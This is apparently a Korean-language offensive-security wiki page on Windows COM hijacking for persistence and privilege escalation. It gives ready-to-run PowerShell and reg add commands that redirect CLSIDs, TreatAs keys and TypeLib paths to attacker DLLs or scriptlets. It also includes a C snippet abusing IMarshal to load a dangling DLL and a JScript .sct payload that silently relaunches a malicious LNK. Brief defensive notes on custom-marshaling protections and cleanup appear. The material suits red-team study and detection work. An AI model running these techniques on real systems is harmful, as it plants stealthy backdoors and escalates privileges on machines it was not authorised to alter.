# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 존재하지 않는 COM 구성 요소 검색

HKCU의 값은 사용자가 수정할 수 있으므로 **COM Hijacking**을 **persistence mechanism**으로 사용할 수 있습니다. `procmon`을 사용하면 아직 존재하지 않으며 공격자가 만들 수 있는 COM 레지스트리 항목을 쉽게 찾을 수 있습니다. 기본 필터:

- **RegOpenKey** 작업.
- _Result_가 **NAME NOT FOUND**인 경우.
- _Path_가 **InprocServer32**로 끝나는 경우.

조사 중 유용한 변형:

- 누락된 **`LocalServer32`** 키도 찾습니다. 일부 COM 클래스는 out-of-process 서버이며 DLL 대신 공격자가 제어하는 EXE를 실행합니다.
- `InprocServer32` 외에 **`TreatAs`** 및 **`ScriptletURL`** 레지스트리 작업도 검색합니다. 최근 탐지 콘텐츠와 malware 분석 글에서 이를 자주 언급하는데, 일반적인 COM 등록 항목보다 훨씬 드물어 탐지 신뢰도가 높기 때문입니다.
- 등록 항목을 HKCU에 복제할 때 원본 `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`의 정당한 **`ThreadingModel`**을 복사합니다. 잘못된 모델을 사용하면 활성화가 실패하는 경우가 많고 hijack이 쉽게 탐지될 수 있습니다.<sup>[[3]](#references)</sup>
- 64비트 시스템에서는 64비트 및 32비트 뷰를 모두 확인합니다(`procmon.exe`와 `procmon64.exe`, `HKLM\Software\Classes`와 `HKLM\Software\Classes\WOW6432Node`). 32비트 애플리케이션은 다른 COM 등록 항목을 확인할 수 있기 때문입니다.

사칭할 존재하지 않는 COM을 정했다면 다음 명령을 실행합니다. _몇 초마다 로드되는 COM을 사칭하기로 했다면, 지나친 선택일 수 있으니 주의하세요._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### 하이재킹 가능한 작업 스케줄러 COM 구성 요소

Windows 작업은 Custom Triggers를 사용해 COM 개체를 호출하며, 작업 스케줄러를 통해 실행되므로 트리거가 작동하는 시점을 더 쉽게 예측할 수 있습니다.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

출력을 확인하면, 예를 들어 **사용자가 로그인할 때마다** 실행되는 항목을 선택할 수 있습니다.

이제 **HKEY\CLASSES\ROOT\CLSID**와 HKLM, HKCU에서 CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**를 검색하면, 일반적으로 HKCU에 해당 값이 존재하지 않는다는 것을 알 수 있습니다.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

그런 다음 HKCU 항목만 만들면 사용자가 로그인할 때마다 backdoor가 실행됩니다.

## Dangling COM 등록 및 Custom Marshaling

시스템 전체 COM 등록은 레지스트리를 변경하지 않고도 DLL-planting primitive가 될 수 있습니다. DLL이 존재하지 않고, 권한이 낮은 사용자가 최종 경로에 파일을 만들거나 수정할 수 있는 `InprocServer32` 값을 찾으세요. 정확한 DLL 이름으로 파일을 심으면 해당 CLSID를 활성화하는 모든 프로세스가 공격자 코드를 로드합니다. CrossDevice 사례에서 등록된 경로는 `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`이었으므로, 일반 사용자가 누락된 하위 디렉터리와 DLL을 만들 수 있었습니다.<sup>[[5]](#references)</sup>

### 쓰기 가능한 플러그인 맵을 통한 권한 있는 COM 활성화 경로

쓰기 가능한 플러그인 ID-CLSID 맵을 이용하면 클래스의 시스템 전체 등록을 수정할 수 없더라도, 권한이 더 낮은 사용자가 권한 있는 서비스가 로드할 인프로세스 COM 서버를 선택할 수 있습니다.<sup>[[8]](#references)[[9]](#references)</sup> 보고된 Windows 11 `InstallService` 사례에서는 일반 사용자가 `StaticPluginMap`을 수정할 수 있었습니다. 기본 제공이 아닌 플러그인 ID는 CLSID를 선택했고, `LocalSystem` 서비스는 해당 CLSID를 `CLSCTX_INPROC_SERVER` 및 `IID_IInstallServicePlugin`과 함께 `CoCreateInstance`에 전달했습니다.<sup>[[8]](#references)[[9]](#references)</sup> 등록된 DLL은 별도의 COM 호스트가 아니라 서비스 프로세스에 로드됩니다.<sup>[[10]](#references)</sup>

관련 조건은 맵에 대한 실질적인 쓰기 권한, 접근 가능한 플러그인 요청, 그리고 권한이 더 낮은 사용자가 제어할 수 있는 `InprocServer32` DLL 경로입니다.<sup>[[8]](#references)[[9]](#references)</sup> 위의 CrossDevice 등록은 보고된 사례에서 경로 조건을 충족했습니다.<sup>[[8]](#references)[[9]](#references)</sup> 플러그인 개체가 성공적으로 사용되려면 요청된 인터페이스를 제공해야 하지만, DLL은 `CoCreateInstance`가 완료되기 전에 로드됩니다. 따라서 해당 인터페이스를 제공하지 못하더라도 로드 중 코드 실행 가능성이 배제되는 것은 아닙니다.<sup>[[8]](#references)[[11]](#references)</sup> 이 서비스 디스패치 경로는 아래의 custom-`IMarshal` 경로와 다릅니다. 별도의 파일 경로 primitive에 대해서는 [DLL Hijacking](dll-hijacking/)을 참조하세요.

### 교차 프로세스 DLL 로드 primitive로서의 `IMarshal`

COM은 일반적으로 표준 `OBJREF`를 사용해 인터페이스 포인터를 나타내며, 이 포인터는 수신 측이 원래 개체를 참조하도록 합니다. `IMarshal`을 구현하는 개체는 대신 custom `OBJREF`를 만들 수 있습니다. 해당 개체의 `GetUnmarshalClass` 메서드는 수신 프로세스에서 개체를 재구성할 코드의 CLSID를 제공합니다. 이 CLSID가 원래 개체를 식별할 필요는 없습니다. COM은 이를 인프로세스 서버로 확인하고, 요청된 인터페이스 메서드를 디스패치하기 전에 등록된 DLL을 로드합니다.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

최소한의 악성 구현은 `GetUnmarshalClass`에서 dangling CLSID로 대체하기만 하면 됩니다.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

프록시된 메서드 매개변수(예: `[in] IUnknown *`)를 통해 이 객체를 전달합니다. 또 다른 방법은 `CoGetInstanceFromIStorage`를 사용하는 것입니다. 이때 custom-marshaled 객체가 로컬 검사를 통과할 만큼의 `IStorage`도 구현해야 합니다. 원격 서버에서 자동으로 unmarshaling할 때 대체된 CLSID가 확인되므로, 대상 메서드가 실행되기 전에 DLL이 로드됩니다.<sup>[[5]](#references)</sup>

이 primitive는 등록 누락에만 국한되지 않습니다. 수신자가 기존 custom-unmarshaler DLL을 로드하도록 강제하고, 해당 DLL의 로드 또는 unmarshaling 경로에 있는 버그를 노출할 수도 있습니다.<sup>[[5]](#references)</sup>

이 chain이 성립하려면 다음 조건을 모두 만족해야 합니다.<sup>[[5]](#references)</sup>

1. 컴퓨터 전체에서 사용할 수 있는 CLSID가 누락되었거나 대체 가능한 in-process DLL을 가리킵니다.
2. 공격자가 해당 DLL을 확인된 경로에 배치할 수 있습니다.
3. 원하는 권한 수준으로 실행되는 활성화 가능한 out-of-process COM 서버가 있습니다.
4. 서버가 custom marshaling을 허용하고, 프로세스 경계를 넘어 공격자 객체를 전달하는 프록시된 호출을 제공합니다.

### 연결이 끊긴 in-process 서버 찾기

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet)과 [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools)는 컴퓨터 전체의 COM 데이터베이스를 열거하고, 일반적인 Win32 모듈 확인을 통해 각 서버를 테스트할 수 있습니다. 일부 등록 정보에는 파일 이름만 포함되어 있고 로더 검색 경로에 의존하므로, `Test-Path`를 사용하는 것보다 이 방법이 낫습니다.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

결과는 exploitability의 증명이 아니라 후보 목록으로 취급하세요. 로더가 처리하는 방식대로 경로를 확인한 다음, 처음으로 존재하는 상위 디렉터리와 DLL이 이미 존재하는 경우 해당 DLL의 DACL을 확인하세요. 파일이 없는 것은 공격자가 COM이 실제로 확인하는 경로를 생성하거나 바꿀 수 있을 때만 유용합니다.<sup>[[5]](#references)</sup>

### 권한이 높은 receiver 선택 및 시작

후보 COM 클래스를 살펴 `RunAs`, 서비스 연결, 사용 가능한 인터페이스, RPC 프록시를 확인하세요. `SYSTEM`으로 설정되어 있지만 이름이 지정된 서비스에 연결되지 않은 클래스는 RPCSS가 시작할 수 없으므로 직접 활성화에 실패할 수 있습니다. 이 경우 실행 가능한 scheduled task처럼 호스트를 시작하는 권한이 낮은 trigger를 찾고, 서버를 계속 실행 상태로 유지하는 데 필요한 named-event 또는 IPC 선행 조건을 재현하세요.<sup>[[5]](#references)</sup>

예를 들어, 취약한 Shell Create Object Handler 체인은 사용자 실행 가능 scheduled task를 호출하기 전에 예상된 global event를 생성해 호스트를 시작했습니다.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

결과 객체 참조를 호스트에 역으로 연결하고, 객체의 정체성과 마샬링 정책을 모두 확인합니다. 그런 다음 인터페이스를 열거하고 프록시를 IDL로 변환해 `IUnknown *`처럼 가짜 객체를 마샬링할 입력 매개변수를 찾습니다.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Custom-marshaling 보호

적절한 receiver는 신뢰할 수 없는 custom marshaler를 거부해야 합니다. 프로세스 전체에 적용되는 보호 기능은 `CoInitializeSecurity`에 전달하는 capabilities에 `EOAC_NO_CUSTOM_MARSHAL`을 설정하는 방법과 `IGlobalOptions::Set`을 통해 `COMGLB_UNMARSHALING_POLICY_STRONG`을 설정하는 방법입니다. 심볼을 사용하면 `combase!gCapabilities` 및 `combase!g_GLBOPT_UnmarshalingPolicy`에서 해당 상태를 확인할 수 있습니다. NtObjectManager는 프로세스 파서가 해당 Windows 빌드를 지원하는 경우 결과를 `CustomMarshalAllowed`로 표시합니다.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs`를 사용하면 하나의 CLSID가 다른 CLSID를 에뮬레이션할 수 있습니다.<sup>[[4]](#references)</sup> 공격 관점에서 보면 원래 CLSID는 그대로 둔 채, `scrobj.dll`을 가리키는 두 번째 사용자별 CLSID를 만들고 `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`를 사용해 실제 COM 객체를 악성 객체로 리디렉션할 수 있습니다.

다음과 같은 경우에 유용합니다.

- 대상 애플리케이션이 로그온 시 또는 앱 시작 시 안정적인 CLSID를 이미 인스턴스화하는 경우
- 원래 `InprocServer32`를 교체하는 대신 레지스트리만으로 리디렉션하려는 경우
- `ScriptletURL` 값을 통해 로컬 또는 원격 `.sct` scriptlet을 실행하려는 경우

공개된 Atomic Red Team tradecraft 및 과거 COM 레지스트리 악용 연구를 바탕으로 한 예시 워크플로:

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notes:

- `scrobj.dll`은 `ScriptletURL` 값을 읽고 참조된 `.sct`를 실행하므로, 페이로드를 로컬 파일로 두거나 HTTP/HTTPS를 통해 원격으로 가져올 수 있습니다.
- 원래 COM 등록이 HKLM에 완전하고 안정적으로 존재하는 경우 `TreatAs`가 특히 유용합니다. 전체 트리를 미러링하는 대신 사용자별 리디렉션만 설정하면 되기 때문입니다.
- 자연스러운 트리거를 기다리지 않고 검증하려면, 대상 클래스가 STA 활성화를 지원하는 경우 `rundll32.exe -sta <ProgID-or-CLSID>`로 가짜 ProgID/CLSID를 직접 인스턴스화할 수 있습니다.

## COM TypeLib Hijacking (script: moniker persistence)

Type Library(TypeLib)는 COM 인터페이스를 정의하며 `LoadTypeLib()`를 통해 로드됩니다. COM 서버를 인스턴스화할 때 OS는 `HKCR\TypeLib\{LIBID}` 아래의 레지스트리 키를 참조하여 관련 TypeLib도 로드할 수 있습니다. TypeLib 경로를 **moniker**(예: `script:C:\...\evil.sct`)로 바꾸면 TypeLib가 확인될 때 Windows가 scriptlet을 실행합니다. 이를 통해 일반적인 구성 요소에 접근할 때 트리거되는 은밀한 persistence를 구현할 수 있습니다.

이 방식은 Microsoft Web Browser 컨트롤(Internet Explorer, WebBrowser를 포함하는 앱, 심지어 `explorer.exe`에서도 자주 로드됨)을 대상으로 사용된 사례가 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 단계 (PowerShell)

1) 자주 사용되는 CLSID에서 사용하는 TypeLib(LIBID)를 식별합니다. 악성코드 체인에서 자주 악용되는 CLSID의 예: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) 사용자별 TypeLib 경로를 `script:` 모니커를 사용해 로컬 scriptlet으로 지정합니다(관리자 권한 불필요):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) 기본 payload를 다시 실행하는 최소한의 JScript `.sct`를 배치합니다(예: 초기 체인에서 사용된 `.lnk`):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) 트리거링 – IE, WebBrowser 컨트롤을 임베드하는 애플리케이션을 열거나 일상적인 Explorer 활동만으로도 TypeLib가 로드되고 scriptlet이 실행되어 로그온/재부팅 시 체인이 다시 활성화됩니다.

정리
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

메모
- 다른 고빈도 COM 구성 요소에도 같은 로직을 적용할 수 있습니다. 먼저 `HKCR\CLSID\{CLSID}\TypeLib`에서 실제 `LIBID`를 확인하세요.
- 64비트 시스템에서는 64비트 소비자를 위해 `win64` 하위 키도 추가할 수 있습니다.

## References

- [1] [TypeLib 하이재킹 – 새로운 COM 지속성 기법 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine 캠페인: 미국 기업을 겨냥한 정교한 피싱 공격](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM 하이재킹 재검토 (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID 키 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Windows 악용 기법: 매달린 COM 개체 등록](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal 인터페이스](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [Dark Elevator PoC 및 기술 설명 (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: Windows Install Service 로컬 권한 상승 (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [CLSCTX 열거형 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [CoCreateInstance 함수 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

